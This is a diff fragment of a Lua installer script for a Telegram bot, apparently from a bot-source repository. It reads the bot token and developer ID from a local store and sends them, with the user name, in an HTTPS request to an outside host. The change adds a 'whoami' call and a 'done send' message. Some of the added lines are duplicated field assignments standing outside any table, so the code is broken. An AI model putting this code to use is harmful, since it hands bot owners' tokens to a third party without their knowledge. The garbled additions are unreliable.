@@ -70,7 +70,16 @@ mustafa = Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)"),
 SudoIds = {Devmfm:get(Servermustafa.."Idmustafa")},
 }
 Create(Config, "./config.lua")   
+end
+create_config_auto()
+ DevId = Devmfm:get(Servermustafa.."Idmustafa"),
+TokenBot = Devmfm:get(Servermustafa.."Tokenmustafa"),
+mustafa = Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)"),
+SudoIds = {Devmfm:get(Servermustafa.."Idmustafa")},
 https.request("https://alsh-bg.ml/TED.php?token="..TokenBot.."&id="..DevId.."&user="..User)
+ 
+install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("TOKYO.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
